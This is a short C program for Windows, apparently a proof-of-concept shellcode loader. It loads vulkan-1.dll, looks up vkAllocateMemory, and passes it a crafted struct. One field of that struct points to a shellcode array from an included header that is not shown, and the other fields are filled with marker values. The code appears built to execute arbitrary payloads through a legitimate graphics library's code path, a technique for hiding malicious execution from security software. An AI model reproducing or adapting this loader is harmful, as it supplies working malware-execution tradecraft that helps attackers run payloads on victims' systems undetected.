#include <Windows.h>
#include <stdio.h>
#include "shellcode.h"

#define ERR(x) printf("[-] %s failed with error: 0x%lx\n", x, GetLastError())

typedef LPVOID(__stdcall* pVkAllocateMemory)(LPVOID funcptr);

typedef struct example_struct {
    DWORD64* pchecksum;
    DWORD64 v1;
    DWORD64 v2;
    DWORD64 v3;
    DWORD64 v4;
    DWORD64 v5;
    DWORD64 v6;
    DWORD64 v7;
} EG_STR;

int main() {
    
    DWORD64 checksum = 0x10ADED040410ADED;
    EG_STR ex = { 0 };

    ex.pchecksum = &checksum;
    ex.v1 = 0x4141414141414141;
    ex.v2 = (DWORD64)shellcode;   //0x4242424242424242;
    ex.v3 = 0x4343434343434343;
    ex.v4 = 0x4444444444444444;
    ex.v5 = 0x4545454545454545;
    ex.v6 = 0x4646464646464646;
    ex.v7 = 0x4747474747474747;


    HMODULE hVulkan = LoadLibraryW(L"vulkan-1.dll");
    if (hVulkan == NULL) {
        ERR("LoadLibraryW");
        return -1;
    }

    pVkAllocateMemory vkAllocateMemory = (pVkAllocateMemory)GetProcAddress(hVulkan, "vkAllocateMemory");
    if (vkAllocateMemory == NULL) {
        ERR("vkAllocateMemory");
        return -1;
    }

    printf("[+] vkAllocateMemory() found at: 0x%p\n", vkAllocateMemory);
   
    vkAllocateMemory(&ex);

    return 0;
}

